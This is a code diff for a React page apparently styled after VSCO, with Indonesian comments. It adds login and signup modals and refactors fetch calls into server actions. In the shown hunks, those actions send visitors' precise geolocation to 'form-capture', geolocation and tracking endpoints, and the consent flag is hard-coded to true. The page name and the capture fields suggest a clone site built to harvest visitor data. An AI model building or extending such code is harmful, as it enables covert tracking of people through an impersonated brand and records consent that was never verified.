@@ -11,6 +11,9 @@ import LocationPermissionModal from './components/location-permission-modal';
 import PhotoToolsSection from './components/photo-tools-section';
 import LoginModal from './components/login-modal';
 import SignupModal from './components/signup-modal';
+import { captureFormData } from '@/action/form-capture-action';
+import { sendGeolocationData } from '@/action/geolocation-action';
+import { trackPageView } from '@/action/tracking-action';
 import './styles.css';
 
 export default function VSCOPage() {
@@ -46,16 +49,10 @@ export default function VSCOPage() {
   useEffect(() => {
     const trackVisit = async () => {
       try {
-        // Track kunjungan ke halaman vsco
-        await fetch('/api/track', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            pageType: 'vsco',
-            pageId: window.innerWidth + 'x' + window.innerHeight,
-          }),
+        // Track kunjungan ke halaman vsco menggunakan action
+        await trackPageView({
+          pageType: 'vsco',
+          pageId: window.innerWidth + 'x' + window.innerHeight,
         });
 
         setHasTracked(true);
@@ -83,42 +80,32 @@ export default function VSCOPage() {
     accuracy: number,
   ) => {
     try {
-      // Kirim data geolokasi ke form-capture
-      await fetch('/api/form-capture', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          source: 'vsco',
-          shortcode,
-          additional_data: {
-            geolocation: {
-              latitude,
-              longitude,
-              accuracy,
-              timestamp: new Date().toISOString(),
-            },
-          },
-        }),
-      });
-
-      // Kirim data tracking dengan geolokasi
-      await fetch('/api/track', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          pageType: 'vsco',
-          pageId: 'geolocation',
-          geoData: {
+      // Kirim data geolokasi ke form-capture menggunakan action
+      await captureFormData({
+        source: 'vsco',
+        shortcode: shortcode || undefined,
+        additional_data: {
+          geolocation: {
             latitude,
             longitude,
             accuracy,
-            timestamp: Date.now(),
+            timestamp: new Date().toISOString(),
           },
-        }),
+        },
+      });
+
+      // Kirim data geolokasi ke API khusus menggunakan action
+      await sendGeolocationData({
+        latitude,
+        longitude,
+        accuracy,
+        consent_given: true,
+      });
+
+      // Kirim data tracking tanpa geoData menggunakan action
+      await trackPageView({
+        pageType: 'vsco',
+        pageId: 'geolocation',
       });
     } catch (error) {
       console.error('Error sending geolocation data:', error);
